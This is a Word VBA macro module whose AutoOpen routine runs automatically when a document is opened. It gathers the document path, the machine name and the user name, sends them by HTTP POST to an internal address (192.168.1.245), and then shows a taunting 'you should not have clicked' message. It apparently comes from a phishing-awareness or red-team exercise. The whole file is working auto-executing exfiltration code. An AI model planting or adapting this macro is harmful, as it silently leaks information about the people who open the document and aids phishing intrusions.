Attribute VB_Name = "NewMacros"
Sub AutoOpen()
'
' AutoOpen Macro
'

'Path stores the current directory
Path = ActiveDocument.Path

'Method Below gives you the directory from where the script was executed
'Path = CurDir()


'ComputerName stores the Machine Name
Dim WshNetwork
Set WshNetwork = CreateObject("WScript.Network")
ComputerName = WshNetwork.ComputerName

'Current user's name
Usern = WshNetwork.UserName

'Another Method of Getting the current User
Set wshShell = CreateObject("WScript.Shell")
User = wshShell.ExpandEnvironmentStrings("%USERNAME%")

'Sending data to server using POST method
Dim xmlhttp, myurl As String
Set xmlhttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")
myurl = "http://192.168.1.245/"
xmlhttp.Open "POST", myurl, False
xmlhttp.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
xmlhttp.Send "workdir=" + Path + "&hostinfo=" + ComputerName + "&curruser=" + Usern

MsgBox ("You should not have clicked this macro!")

End Sub
